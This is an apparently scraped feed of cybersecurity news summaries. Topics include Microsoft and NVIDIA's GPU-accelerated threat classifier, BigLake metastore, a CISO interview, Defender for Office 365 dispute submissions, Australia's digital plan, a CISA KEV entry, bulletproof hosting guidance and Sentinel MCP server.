      "summary": "Collaborative Research by Microsoft and NVIDIA on Real-Time Immunity Authors: Abe Starosta (Microsoft), Rachel Allen (NVIDIA) and Rohan Varma (NVIDIA) AI-Powered Threats Demand AI-Powered Defense While AI supports growth and innovation, it is also reshaping how organizations address increasingly adaptive security risks. AI-driven security threats, including \u201cvibe-hacking\u201d, are evolving faster than traditional defenses can adapt. Attackers can now combine reinforcement learning (RL) with LLM capabilities in code generation, tool use, and multi-step reasoning to develop new methods that can mutate and bypass defenses in real time\u2014challenging the ability of human response teams to keep up. Traditional security tools, built on static rules and signatures, are quickly becoming obsolete. To stay protected, enterprises need to adopt AI-powered cybersecurity systems that learn, anticipate, and respond as intelligent defenders. This is where Adversarial Learning, a critical new frontier in security, comes in. By continuously training threat and defense models together, it is possible to build autonomic defense against malicious use of AI. However, achieving real-time security requires scaling transformer-based architectures and optimizing them for ultra-low-latency inference at massive scale. \u201cAdversarial learning only works in production when latency, throughput, and accuracy move together. NVIDIA\u2019s custom GPU kernel and tokenizer improvements gave us the headroom we needed to deliver real-time protection at enterprise scale\u2014a meaningful step forward in defending enterprise customers against AI-driven attacks.\u201d \u2014 Abe Starosta, Principal Applied Research Manager, Microsoft NEXT.ai This post highlights how Microsoft and NVIDIA are transforming adversarial learning research into real-time, adaptive solutions to improve cyber defenses\u2014leveraging GPU-accelerated computing to deliver scalable, adaptive protection. Strategic Collaboration: Building Real-Time Threat Detection Once trained, deploying transformer models for live traffic analysis demands an inference engine that can match the volume and velocity of production workloads\u2014without compromising detection accuracy. Through joint engineering efforts, Microsoft and NVIDIA achieved 160X performance speedup s by transitioning from CPU to GPU compute: Metric CPU Baseline GPU Baseline Triton on NVIDIA H100 GPU Optimized Triton on NVIDIA H100 with further optimizations End-to-End Latency 1239.67 ms 17.8 ms 7.67 ms Throughput 0.81 req/s 57 req/s > 130 req/s Detection Accuracy - - >95% on adversarial benchmarks This end-to-end latency, which includes network latency, demonstrates the viability of deploying adversarial learning at an enterprise scale. Microsoft\u2019s Contributions: Adversarial Learning, Model Training & Optimization To achieve high detection accuracy on adversarial traffic, Microsoft researchers trained and optimized transformer-based classifiers to detect malicious payloads. Key innovations included: Adversarial learning pipeline Model distillation and architecture Security-specific input segmentation that enabled NVIDIA to develop parallel tokenization These enhancements laid the foundation for high-precision detection and enabling AI models which can generalize across diverse threat variants. NVIDIA Contributions: Accelerating Inference at Scale Beyond baseline GPU acceleration, two NVIDIA innovations were critical to achieving real-time latency targets: 1. Optimized GPU Classifier (NVIDIA Dynamo-Triton + NVIDIA TensorRT): NVIDIA optimized Microsoft\u2019s classifier by creating custom kernels and leveraging auto optimizations using NVIDIA TensorRT and fusing key operations into a single CUDA kernel to minimize memory traffic and launch overhead. In particular, normalization operations were automatically fused into kernels of preceding operations by TensorRT, while custom CUDA kernels were developed to optimize both sliding window attention and dense layer activation functions. All custom kernels were then compiled together into a TensorRT engine and served via NVIDIA Dynamo- Triton to minimize host overhead. \u201cSecuring enterprises means matching the volume and velocity of cybersecurity data and adapting to the innovation speed of adversaries. Defensive models need the ultra-low latency to run at line-rate and the adaptability to protect against the latest threats. The combination of adversarial learning with NVIDIA TensorRT accelerated transformer-based detection models does just that.\u201d - Rachel Allen, Cybersecurity Manager, NVIDIA Overall, the NVIDIA inference optimization led to significant performance boosts compared to standard GPU solutions, reducing forward-pass latency from 9.45 ms to 3.39 ms. This represented a 2.8\u00d7 speedup and contributed 6.06 ms of the total 10.13 ms end-to-end latency reduction reported in the performance breakdown above. 2. Domain-Specific Tokenization After optimizing the threat-detection classifier, the data pre-processing pipeline emerged as the next major performance bottleneck. Traditional tokenization techniques often fall short when it comes to leveraging parallelism within a sequence. While whitespace-based segmentation may suffice for conventional content like articles or documentation, it proves inadequate for densely packed request strings. These strings, common in security-sensitive environments, resist balanced segmentation, leading to inefficiencies in downstream processing. To address the challenges of processing dense machine-generated payloads, NVIDIA engineered a domain-specific tokenizer optimized for low-latency environments. By integrating segmentation points developed by Microsoft, tailored to the structural nuances of machine data, the tokenizer unlocked finer-grained parallelism, delivering a 3.5\u00d7 reduction in tokenization latency. These cumulative engineering breakthroughs will enable Microsoft to deploy a high-performance threat-detection classifier capable of efficiently handling a wide range of sequence lengths in real-time. Inference Stack: Serving: NVIDIA Dynamo - Triton Inference Server Model: NVIDIA TensorRT implementation of Microsoft\u2019s threat classifier Tokenizer: Custom tokenizer optimized for security data Custom CUDA Kernels: Embedding + Normalization Residual Add + Normalization Activation Function Sliding Window Flash Attention Real-World Impact Speed: Real-time classification enables truly inline adversarial detection for production traffic, without introducing queueing delays. Scale: Sustained GPU throughput (> 130 req/s on H100); supports high-traffic endpoints and bursty workloads. Accuracy: >95% detection accuracy on representative adversarial inputs provides robust coverage against rapidly evolving threat variants. What\u2019s Next The roadmap and deep engineering collaboration continues to push the boundaries of real-time threat-detection. Future efforts will explore advanced model architectures for adversarial robustness and advanced acceleration techniques such as quantization. The next phase will significantly broaden the impact of adversarial learning in practical cybersecurity applications. By training models on malicious patterns, we\u2019re equipping them to manage higher traffic volumes and increasingly intricate payloads\u2014while maintaining strict latency constraints. These innovations collectively lay the foundation for faster, more robust defenses that can keep pace with the escalating scale and complexity of today\u2019s AI-driven cyber threats.

      "title": "Iceberg REST Catalog now supported in BigLake metastore (GA) for open data interoperability",
      "summary": "Today, many organizations are moving towards lakehouse architectures to have a single copy of their data and use multiple engines for different workloads \u2014 without having to copy or move the data. However, managing a data lakehouse can be complex, often requiring custom pipelines that are hard to operate and that aren\u2019t interoperable between query engines. Further, governance can be challenging when you have independent systems in multiple, local silos. One way to succeed with a lakehouse architecture is to implement a metadata layer across your data engines. BigLake metastore is Google Cloud\u2019s fully-managed, serverless, and scalable runtime metastore based on the industry-standard Apache Iceberg REST Spec , providing a standard REST interface for wider compatibility and interoperability across OSS engines like Apache Spark, as well as Google Cloud native engines such as BigQuery. Today, we\u2019re excited to announce that support for the Iceberg REST Catalog is now generally available. Now your users can query using their engine of choice across open-source engines such as Apache Spark and Trino, as well as native engines like BigQuery, all backed with the enterprise security offered by Google Cloud. For example, Spark users can utilize the BigLake metastore as a serverless Iceberg catalog to share the same copy of data with other engines, including BigQuery. BigLake metastore also provides support for key authorization mechanisms such as credential vending, allowing users to access their tables without having direct access to the files in the underlying Google Cloud Storage bucket. Finally, BigLake metastore is integrated with Dataplex Universal Catalog so you get end-to-end governance complete with comprehensive lineage, data quality, and discoverability capabilities for BigLake Iceberg tables in BigQuery. Powered by Google's planet-scale metadata management infrastructure based on Spanner, BigLake metastore removes the need to manage custom metastore deployments, giving you the benefits of an open and flexible lakehouse with the performance and interoperability of an enterprise-grade managed service. Leading organizations building their lakehouses with Google\u2019s Data Cloud are already seeing the benefits of BigLake metastore. \u201cSpotify is leveraging BigLake and BigLake metastore as part of our efforts to build a modern lakehouse platform. By utilizing open formats and open APIs, this platform provides an interoperable and abstracted storage interface for our data. BigLake helps us make our data accessible for processing by BigQuery, Dataflow and open-source, Iceberg-compatible engines.\u201d - Ed Byne, Product Manager, Spotify Simplify data management and unify governance BigLake metastore has a new UX console in which you can create and update your Iceberg Catalog. For easy access, the console lets you access all your Cloud Storage and BigQuery storage data across multiple runtimes, including BigQuery, and open-source, Iceberg-compatible engines such as Spark and Trino. For example, a data engineer can create Iceberg tables in Spark and the same data can be accessed by a data analyst in BigQuery. This gives you a single view of all of your Iceberg tables across Google Cloud, whether they\u2019re managed by BigLake or self-managed in Cloud Storage. Get started using the Iceberg REST catalog The BigLake UX console also lets you quickly create a catalog for your Iceberg data in Cloud Storage, rather than having to do it from the source. With BigLake metastore, you can enjoy the following benefits: Unified metadata: Shared runtime metadata across various engines, data formats and modalities, so you can understand and process the same underlying data without needing proprietary connectors or data copies. This enables data engineers to share the same data across multiple engines, leading to faster time to market for their key use cases. Open APIs for interoperability : Supports interoperability with open-source and third-party engines through Iceberg REST Catalog, so different teams can use their preferred analytics tools on a single, unified dataset. Broad storage support: Integrated access and processing with data stored in Cloud Storage or BigQuery, helping you maximize data utility and maintain flexible storage without moving or copying data. Serverless: Reduced TCO due to serverless and no-ops environments and scalability for any workload size. Enterprise readiness and scale: Backed by Google\u2019s planet-scale infrastructure and Spanner, so your metadata can scale with your data. There\u2019s also support for Cloud Storage Dual Region and Multi-Region buckets for data and catalog redundancy. AI-powered governance: End-to-end governance complete with comprehensive lineage, data quality, and discoverability capabilities for BigLake Iceberg tables in BigQuery, and integrated with Dataplex Universal Catalog . Unlock new AI use cases with your data lakehouse Google\u2019s Data Cloud is built on Google's vast infrastructure and powered by AI, offering a unified platform for AI-ready data. This allows you to build open lakehouse architecture s designed to handle both structured and multimodal data, so you can unlock new AI use cases. W ith BigLake and BigLake metastore, you can enable richer AI processing on your Iceberg data using BigQuery AI functions for text generation, text or unstructured data analysis, and translation. These functions access Gemini and partner LLM models available from Vertex AI, Cloud AI APIs, or built-in BigQuery models. Further, you can train, evaluate, and run ML models like linear regression, k-means clustering, or time-series forecasts directly on your Iceberg data using BigQuery ML. Let\u2019s take an example. Imagine you\u2019re a data engineer at a large retail company, and a data analyst wants to access a product returns table to view a list of returned products. Some of the returns data is inserted into an Iceberg table by a data scientist on the Marketing team using Spark. Spark uses BigLake metastore Iceberg REST Catalog as the Catalog for the Iceberg table. Then, with the help of the Iceberg REST Catalog, the data scientist can immediately analyze the returns data, using BigQuery to list the returned products, BigQuery\u2019s AI Generate function to describe the products, and BigQuery ML to plot a logistic regression model for the returns. The whole process is fast thanks to the use of the Cloud Storage FileIO implementation ( GCSFileIO ), while Dataplex Universal Catalog provides governance capabilities for BigLake Iceberg tables in BigQuery. Learn more With BigLake metastore, you now have a fully-managed, serverless, and scalable runtime metastore, enabling an open and interoperable lakehouse for your organization.

AI is driving broad executive and board of director interest in security and governance in a way that hasn\u2019t been seen before \u2014 and they\u2019re turning to their CISOs for advice. Phil Venables, Google Cloud\u2019s current strategic security advisor and former CISO, explained why some CISOs are well-suited for their evolving role. David Homovich, Advocacy Lead, Office of the CISO \u201cA common pattern of success for organizations that breed great security and other leaders is that the existing leaders pay attention to detail. They go deep occasionally. They validate things. They understand how the organization works. They understand how technology works. They understand how the business works,\u201d he said during his keynote address at a Google Cloud CISO Community event in New York City earlier this month. \u201cThey pay close attention to detail, and that promulgates the same sense of detail focus in the rest of their organization, that ultimately develops more and more leaders,\u201d he said. As their role evolves, CISOs should drive the evolution of their organization\u2019s approach to cybersecurity from a fire station, reacting to disasters, to a flywheel, self- sustaining and continuously enhancing the business. Organizations that encourage these behaviors, which Venables described as \u201cCISO Factories\u201d because they develop a disproportionate number of successful CISOs, aren\u2019t magical. They share 12 common traits that can be replicated. The 12 common characteristics found at organizations that encourage and develop a culture of excellence. Through discussions at these CISO Community events and throughout the year, Google Cloud\u2019s Office of the CISO has seen that the role of the CISO is widely varied and often misunderstood. Nevertheless, a successful security program is one of the highest-leverage contributions an individual can make to a modern enterprise, building resilience and durable trust with customers. As their role evolves, CISOs should drive the evolution of their organization\u2019s approach to cybersecurity from a fire station, reacting to disasters, to a flywheel, self-sustaining and continuously enhancing the business. The following transcript has been lightly edited. Alicja Cade : After three decades as a CISO, can you share your thoughts on what it means to be a CISO in 2025? Phil Venables : I'm still connected quite deeply with the CISO community and the security community around the world. I've been spending more time observing and thinking about how the CISO role is changing \u2014 and it seems to be changing ever-quicker. Phil Venables, strategic security advisor, Google Cloud I've also spent a lot of time thinking about what it means to develop and build the next generation of security leaders. One of the things I'm seeing quite a lot is the CISO role going in many different directions. At many organizations, the CISO is in effect or actually becoming the chief technology officer, where CISOs are trying to push harder and harder for their organization to upgrade and enhance their technology. In many cases, leadership and the boards are giving them the CTO responsibility, or the CISO is forming an ever closer partnership with the CTO or the head of infrastructure to massively upgrade their technology to be more inherently secure and defendable. I think that's good progress. Alicja Cade : How is AI changing the role of the CISO? Phil Venables : Boards of directors want to know if what their company is doing with AI is safe and compliant, is it respecting privacy and all the trust and safety boundaries \u2014 and they\u2019re turning to the CISO to talk about that. Now, that's not all organizations. There are many large financial organizations that have got quite mature compliance and risk functions that are picking up their weight. But other organizations typically, especially those not necessarily in the historically very tightly regulated industries, the CISO is becoming almost like the chief digital risk officer. The CISO is being tasked with worrying about all of these other technology risks that are coming out as a result of AI. AI\u2019s not the only reason, but we're certainly seeing an evolution of the CISO role to be something what you might call kind of CISO version two, a much more evolved role. David Homovich : This leveling-up of the CISO is not exactly new, but the circumstances that are driving it have been changed by the AI era. How do you describe the current iteration of CISO 2.0? Phil Venables : The CISO is absolutely, undeniably becoming a peer business executive alongside all the other executives. How you secure and defend what most of our businesses are, as digital businesses, is becoming so critical that the CISO has to evolve. The version two CISO mindset is really all about being business first. While we've talked about this for years, in many cases CISOs have been catching up with where the business wants to go and not leading the business where it needs to be. There are three pillars to CISO 2.0: CISOs should realize they\u2019re peer business executives. They don\u2019t just follow business initiatives to make sure they're secure, but lead and educate the business on what opportunities may come about from the results of doing digitization in safe and secure ways. CISOs need to be a peer technology leader and have technical empathy. While the most successful CISOs are not primarily engineering leaders, they certainly have to be technically deep \u2014 or at least have an appreciation of technology and be able to work at a detailed level with the technology and engineering leaders and officers. CISOs should be able to suggest ways of engineering technology to help the organization create more secure by default, secure by design implementations. CISOs need to be long-term players. We all know many of the security activities and risk mitigation activities that we have to drive are things that just take years \u2014 even though we wish they would take quarters. This may be a little bit of selection bias, but the most successful CISOs are ones who manage to stay around for the longest time to see the results and drive the results of their change. I'm not oblivious to the fact that there's some organizations where people just have to go because they see the writing on the wall, that there's no way they can have as much effect. But we also have to be honest with ourselves. There's also plenty of cases where security leaders decide to go get the next job at the first point of resistance, as opposed to pushing through and realizing more long-term success. Alicja Cade : How do CISOs engage in a way that can build that long-term success? Phil Venables : When you look at the overall CISO 2.0 strategy, it's all about actually having a strategy. CISOs should really be brutal with themselves when they look at their strategy, and ask if their strategy is actually a strategy \u2014 or just a long-term plan that just has the word strategy written on the front. Strategy is a theory of how to win for your organization, and it's distinct from plans. The plans come from the strategy, but strategy could be, for example, how we want the business to be able to pull help from the security team. That\u2019s a deliberate strategy that amplifies the engagement of the business. Then you plan, you go do things that are necessary, to create that pull. Another example is that a big part of the strategy is encouraging transparency and accountability for risk, so that you get more self-correction in the environment. Then you\u2019ve got to go do things to implement that strategy. David Homovich : The relationship between CISOs and their board of directors can often feel lacking. Can you talk about why boards and CISOs should be more important to each other? Phil Venables : We talk a lot about interactions with boards and with the board and what the board expects. One of the great common patterns of some of the best security organizations is they just aren\u2019t good at interacting with the board. They haven\u2019t given the board the right metrics, or they just don't figure out how to educate new board members. It\u2019s under the control of the CISO and the wider leadership team to educate the board, to build relationships with board members and equip the board with how to be an effective overseer of what the CISO needs to do. The good news is that when you actually speak to board members, they're eager to be educated. They want to be better board members to oversee security. CISOs can influence board members, and boards can help influence business leaders. An example of this is when organizations more consciously use their buying power to drive the right behaviors in suppliers. Take a supplier that tells a customer that they\u2019re the only company asking for a necessary security improvement that should be there by default, whereas in reality the supplier just wants to charge everybody for it. It only takes a few companies of reasonable scale to actually call out the CEO of those companies to start triggering better behavior. It\u2019s important that we think about all of our roles in the security and business community more broadly.

      "title": "You may be right after all! Disputing Submission Responses in Microsoft Defender for Office 365",
      "summary": "Introduction As a Microsoft MVP (Most Valuable Professional) specializing in SIEM, XDR, and Cloud Security, I have witnessed the rapid evolution of cybersecurity technologies, especially those designed to protect organizations from sophisticated threats targeting email and collaboration tools. Microsoft Defender for Office 365 introduced an LLM-based engine to help better classify phishing emails that, these days, are mostly written using AI anyways about a year ago. Today, I'm excited to spotlight a new place AI has been inserted into a workflow to make it better\u2026a feature that elevates the transparency and responsiveness of threat management: the ability to dispute a submission response directly within Microsoft Defender for Office 365. Understanding the Challenge While the automated and human-driven analyses are robust in Defender for Office 365, there are occasions where the response\u2014be it a verdict of \"benign\" or \"malicious\"\u2014 doesn\u2019t fully align with the security team's context or threat intelligence. If you are a Microsoft 365 organization with Exchange Online mailboxes, you\u2019re probably familiar with how admins can use the Submissions page in the Microsoft Defender portal to submit messages, URLs, and attachments to Microsoft for analysis. As a recent enhancement, now all the admin submissions use LLM based response for better explainability. In the past, disputing such verdicts required separate support channels, using Community support, or manual email processes, often delaying resolution and impacting the speed of cyber operations. Introducing the Dispute Submission Response Feature With the new dispute submission response feature, Microsoft Defender for Office 365 bridges a critical gap in the incident response workflow. Now, when a security analyst or administrator receives a verdict on a submitted item, they have the option to dispute the response directly within the Microsoft 365 Defender portal. This feature streamlines feedback, allowing teams to quickly flag disagreements and provide additional context for review at the speed of operations. How It Works Upon submission of a suspicious item, Microsoft Defender for Office 365 provides a response indicating its assessment\u2014malicious, benign, or other categorizations. If the security team disagrees with the verdict, they can select the \"Dispute\" option and submit their rationale, including supporting evidence and threat intelligence. The disputed case is escalated directly to Microsoft\u2019s threat research team for further review, and the team is notified of progress and outcomes. This direct feedback loop not only empowers security teams to advocate for their organization's unique context, but also enables Microsoft to continually refine detection algorithms and verdict accuracy based on real-world input, because security is a team sport. Benefits for Security Operations Faster Resolution : Streamlined dispute submission eliminates the need for external support tickets and escalations, reducing turnaround time for critical cases. Greater Transparency : The feature fosters a collaborative relationship between customers and Microsoft, ensuring that verdicts are not final judgments but points in an ongoing dialogue. Continuous Improvement : Feedback from disputes enhances Microsoft\u2019s threat intelligence and improves detection for all Defender for Office 365 users. Empowerment : Security teams gain a stronger voice in the protection of their environment, reinforcing trust in automated defenses. MVP Insights: Real-World Impact Having worked with global enterprises, I\u2019ve seen how nuanced and context-specific threats can be. Sometimes, what appears benign to one organization may be a targeted attack for another, a slight modification to a URL may catch one email, but not others, as slight changes are made as billions of emails are sent. We are only as good as the consortium. The ability to dispute submission responses creates a vital safety net, ensuring that security teams are not forced to accept verdicts that could expose them to risk. It\u2019s a welcome step toward adaptive, user-driven security operations. Conclusion The dispute submission response feature in Microsoft Defender for Office 365 is one of the most exciting features for me, because it focuses on enabling organizations striving for agility and accuracy in threat management. By enabling direct, contextual feedback, Microsoft empowers security teams to play an active role in shaping their defenses. As an MVP, I encourage all users to leverage this feature, provide detailed feedback, and help drive the future of secure collaboration in the cloud.

      "summary": "The Australian 2025 Implementation Plan \" data-image-caption=\"\" data-medium-file=\"https://cyble.com/wp-content/uploads/2025/11/The-Australian-2025-Implementation-Plan-300x150.webp\" data-large-file=\"https://cyble.com/wp-content/uploads/2025/11/The-Australian-2025-Implementation-Plan.webp\" title=\"Australia Releases 2025 Implementation Plan to Advance National Data and Digital Transformation 4\"> The Australian Government has released the 2025 Implementation Plan, the latest annual update to the Data and Digital Government Strategy. The document outlines how federal agencies are progressing toward the Strategy\u2019s 2030 vision of delivering simple, secure, and connected public services through world-class digital and data capabilities. The Strategy itself is jointly led by the Digital Transformation Agency (DTA) and the Department of Finance. According to the Government, this year\u2019s update demonstrates how strengthened data foundations, responsible technology adoption, and coordinated national initiatives are shaping the country\u2019s digital future. It also highlights how agencies are integrating emerging tools, including artificial intelligence, while maintaining a strong focus on public trust and Australian cybersecurity . DTA CEO Chris Fechner said the plan highlights how long-term commitments are translating into measurable improvements across government systems. \u201cThis year\u2019s Implementation Plan showcases how the government\u2019s long-term digital vision is being delivered in practice,\u201d he stated. Fechner added that public sector teams are increasing capability and refining their use of technology \u201cin pursuit of delivering services that are simpler, smarter, and easier for people to access while safeguarding their information.\u201d Priorities Shaping the 2025 Implementation Plan The 2025 Implementation Plan outlines four central priorities for the coming year: Artificial intelligence (AI) Data Connected service delivery Cyber trust and resilience Together, these areas define how the government will design and deliver secure, user-centered digital services while aligning with broader efforts to improve cybersecurity in Australia. Responsible Integration of Artificial Intelligence The Government is expanding its use of AI across the public service, with applications aimed at improving decision-making, accelerating service delivery, and supporting productivity. These initiatives operate under a structured set of protection. The plan highlights several frameworks guiding the responsible use of AI: AI Plan for the APS, which outlines actions to build capability, improve oversight, and ensure accountability. Policy for the responsible use of AI in government, establishing governance and ethical standards for AI adoption. AI technical standards, providing a consistent baseline for design, development and deployment. GovAI platform, a central hub offering agencies access to tools, training materials and guidance. Fechner reiterated that new technologies must be deployed with caution. \u201cOur priority is to use these emerging technologies responsibly and transparently, so the benefits are realized where they matter most,\u201d he said. Strengthening Data for Better Decision-Making The Department of Finance is leading the work to help agencies develop better data capabilities. The Government notes that high-quality data strengthens evidence-based decision-making and improves digital services by ensuring agencies understand public needs more accurately. Achievements highlighted in the 2025 Implementation Plan include: Data Maturity Assessment Tool, enabling agencies to measure their progress in data capability development. Data Governance Framework, a resource for public servants to strengthen governance processes. Statutory Review of the Data Availability and Transparency Act 2022, examining whether the Act is improving data sharing and transparency. Digital Atlas of Australia, a national platform combining geography, demographic, economic and environmental data for analysis and visualization. Fechner stressed the importance of data-driven decisions, noting that \u201cdata provides the insight that helps government make informed choices and deliver targeted, practical outcomes for all people and businesses.\u201d Strong data foundations, he said, translate into more effective policies and services. More Connected, Consistent, and User-Centered Services The Plan emphasizes continued improvements to major digital platforms, including myGov and Digital ID, which streamline how people and businesses interact with the government. These systems aim to deliver secure, reliable access to essential services while reducing administrative complexity. Guidance tools such as the Digital Experience Policy and APS Experience Design Principles are also shaping service design, ensuring agencies consider real-world user experiences and improve accessibility across diverse communities. \u201cEvery interaction with government should be straightforward and seamless,\u201d Fechner said, denoting the need for consistency and faster support at critical moments. Building Cyber Trust and Digital Resilience As more services move online, the Government is investing heavily in strengthening digital resilience and protecting cyber threats . Key initiatives include the Cyber Security Strategy, the Systems of Government Significance Standard, and efforts led by the National Anti-Scam Centre. These programs enhance protections for personal data, support safer online interactions and reinforce the broader framework of Australian cybersecurity . Fechner highlighted that trust remains essential to digital government: \u201cAustralians should have confidence that their information is protected and that the systems they rely on are safe, secure and resilient.\u201d Progress Toward the 2030 Vision The 2025 Implementation Plan, the third update since the Strategy\u2019s launch, shows strong progress across 2023 and 2024 toward delivering seamless services, strengthening data foundations, and ensuring trusted, secure systems. Aligned with broader initiatives such as the APS Data, Digital and Cyber Workforce Plan and Australia\u2019s 2023\u20132030 Cyber Security Strategy, the Plan highlights upcoming work to expand responsible AI use, improve data integration, and lift digital resilience across critical systems, key priorities for strengthening cybersecurity in Australia.

This is the talk. Thirty years ago, a debate raged over whether vulnerability disclosure was good for computer security. On one side, full disclosure advocates argued that software bugs weren\u2019t getting fixed and wouldn\u2019t get fixed if companies that made insecure software wasn\u2019t called out publicly. On the other side, companies argued that full disclosure led to exploitation of unpatched vulnerabilities, especially if they were hard to fix. After blog posts, public debates, and countless mailing list flame wars, there emerged a compromise solution: coordinated vulnerability disclosure, where vulnerabilities were disclosed after a period of confidentiality where vendors can attempt to fix things. Although full disclosure fell out of fashion, disclosure won and security through obscurity lost. We\u2019ve lived happily ever after since...",

CVE-2025-13223 Google Chromium V8 Type Confusion Vulnerability This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise. Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the BOD 22-01 Fact Sheet for more information. Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of KEV Catalog vulnerabilities as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria .",

      "title": "CISA Releases Guide to Mitigate Risks from Bulletproof Hosting Providers",
      "summary": "Today, Cybersecurity and Infrastructure Security Agency (CISA), in collaboration with the U.S. National Security Agency, U.S. Department of Defense Cyber Crime Center, U.S. Federal Bureau of Investigation, and international partners, released the guide Bulletproof Defense: Mitigating Risks from Bulletproof Hosting Providers to help Internet Service Providers (ISPs) and network defenders mitigate cybercriminal activity enabled by Bulletproof Hosting (BPH) providers. A BPH provider is an internet infrastructure provider that knowingly leases infrastructure to cybercriminals. These providers enable malicious activities such as ransomware, phishing, malware delivery, and denial-of-service (DoS) attacks, posing an imminent and significant risk to the resilience and safety of critical systems and services. The guide provides recommendations to reduce the effectiveness of BPH infrastructure while minimizing disruptions to legitimate activity. Key Recommendations for ISPs and Network Defenders: Curate malicious resource lists: Use threat intelligence feeds and sharing channels to build lists of malicious resources. Implement filters: Apply filters to block malicious traffic while avoiding disruptions to legitimate activity. Analyze traffic: Monitor network traffic to identify anomalies and supplement malicious resource lists. Use logging systems: Record Autonomous System Numbers (ASNs) and IP addresses, issue alerts for malicious activity, and keep logs updated. Share intelligence: Collaborate with public and private entities to strengthen cybersecurity defenses. Additional Recommendations for ISPs: Notify customers: Inform customers about malicious resource lists and filters, with opt-out options. Provide filters: Offer premade filters for customers to apply in their networks. Set accountability standards: Work with other ISPs to create codes of conduct for BPH abuse prevention. Vet customers: Collect and verify customer information to prevent BPH providers from leasing ISP infrastructure. CISA and its partners urge ISPs and network defenders to implement these recommendations to mitigate risks posed by BPH providers. By reducing the effectiveness of BPH infrastructure, defenders can force cybercriminals to rely on legitimate providers that comply with legal processes.

      "summary": "Today, we\u2019re excited to announce the General Availability of Microsoft Sentinel MCP (Model Context Protocol) server, a fully managed cloud service built on an open standard that empowers AI agents to seamlessly access your entire security context through natural language, eliminating the need for complex data engineering as you build agents. This unlocks new levels of AI agent performance and effectiveness, enabling them to do more for you. Since the public preview launch on September 30, hundreds of customers have explored MCP tools that provide semantic access to their entire security context. These tools allow security AI agents to operate with unprecedented precision by understanding your unique security context in natural language. Today, we\u2019re introducing multiple innovations and new capabilities designed to help even more customers unlock more with AI-driven security. This post offers a high-level overview of what\u2019s new. Stay tuned for deep-dive blogs that will unpack each feature in detail. Connect to Sentinel MCP server from Multiple AI Platforms By adopting the MCP open standard, we can progress on our mission to empower effective AI agents wherever you choose to run them. Beyond Security Copilot and VSCode Github Copilot, Sentinel MCP server is now natively integrated with Copilot Studio and Microsoft Foundry agent-building experiences. When creating an agent in any of these platforms, you can easily select Sentinel MCP tools, no pre-configuration required. It\u2019s ready to use, so if you are using any of these platforms, dive in and give it a try. Click here for detailed guidance Figure 1: Microsoft Copilot Studio Figure 2: Microsoft Foundry Additionally, you can now connect OpenAI ChatGPT to Sentinel MCP server through a secured OAuth authentication through a simple configuration in Entra. Learn how here Figure 3: ChatGPT uses Sentinel MCP tools to assess threat impact on your organization Custom KQL Tools Many organizations rely on a curated library of KQL queries for incident triage, investigation, and threat hunting used in manual Standard Operating Procedures (SOP) or SOAR playbooks\u2014often managed within Defender Advanced Hunting. Now, with Sentinel MCP server, you can instantly transform these saved KQL queries into custom tools with just a click. This new capability allows you to empower your AI agents with precise, actionable data tailored to your unique security workflows. Once a KQL query is saved as a tool, Sentinel MCP server automatically creates and maintains a corresponding MCP tool\u2014ensuring it\u2019s always in sync with the latest version of your saved query in Defender Advanced Hunting. Any connected agent can invoke this tool, confident it reflects your most current logic and requirements. Learn more here Figure 4: Converting saved queries to MCP tools through Defender Advanced Hunting Entity Analyzer Assessing the risk of entities is a core task for SOC teams\u2014whether triaging incidents, investigating threats, or automating response workflows. Traditionally, this has required building complex playbooks or custom logic to gather and analyze fragmented security data from multiple sources. With entity analyzer, this complexity is eliminated. The tool leverages your organization\u2019s security data in Sentinel to deliver comprehensive, reasoned risk assessments for any entity your agents encounter \u2013 starting with users and urls. By providing a unified, out-of-the-box solution for entity analysis, entity analyzer enables your AI agents to make smarter decisions and automate more tasks\u2014without the need to manually engineer risk evaluation logic for each entity type. This not only accelerates agent development, but also ensures your agents are always working with the most relevant and up-to-date context from across your security environment. Entity Analyzer is now available to any MCP client integrated with Sentinel MCP Server. And for those building SOAR workflows, entity analyzer is natively integrated with Logic Apps, making it easy to enrich entities and automate verdicts within your playbooks. Learn how to build a Logic Apps playbook with Entity Analyzer Graph Tools Microsoft Sentinel graph connects assets, identities, activities, and threat intelligence into a unified security graph, uncovering insights that structured data alone can\u2019t provide such as relationships, blast radius, and attack paths. The graph is now generally available , and these advanced insights can be accessed by AI agents in natural language through a dedicated set of MCP tools. Graph MCP tools are offered in a sign-up preview . Triage Incidents and Alerts Sentinel MCP server extends to enable natural language access to a set of APIs that enable incident and alert triage. AI agents can use these tools to carry out autonomous triage and investigation of Defender XDR and Sentinel alerts and incidents. In the next couple of weeks, it will be available, out of the box, to all customers using Microsoft Defender XDR, Microsoft Sentinel or Microsoft Defender for Endpoint. Stay tuned. Smarter Security, Less Effort With the latest innovations in Sentinel MCP server, security teams can now harness the full power of AI-driven automation with unprecedented simplicity and impact. From seamless integration with leading AI platforms to instant creation of custom KQL tools and out-of-the-box entity analysis, Sentinel MCP server empowers your agents to deliver smarter, faster, and more effective security outcomes. These advancements eliminate manual complexity, accelerate agent development, and ensure your SOC is always equipped with the most relevant context. Currently, features like entity analysis are available at no additional charge; as we continue to evolve the platform, we\u2019ll share updates on future pricing well in advance.

      "title": "Empowering organizations with integrated data security: What\u2019s new in Microsoft Purview",
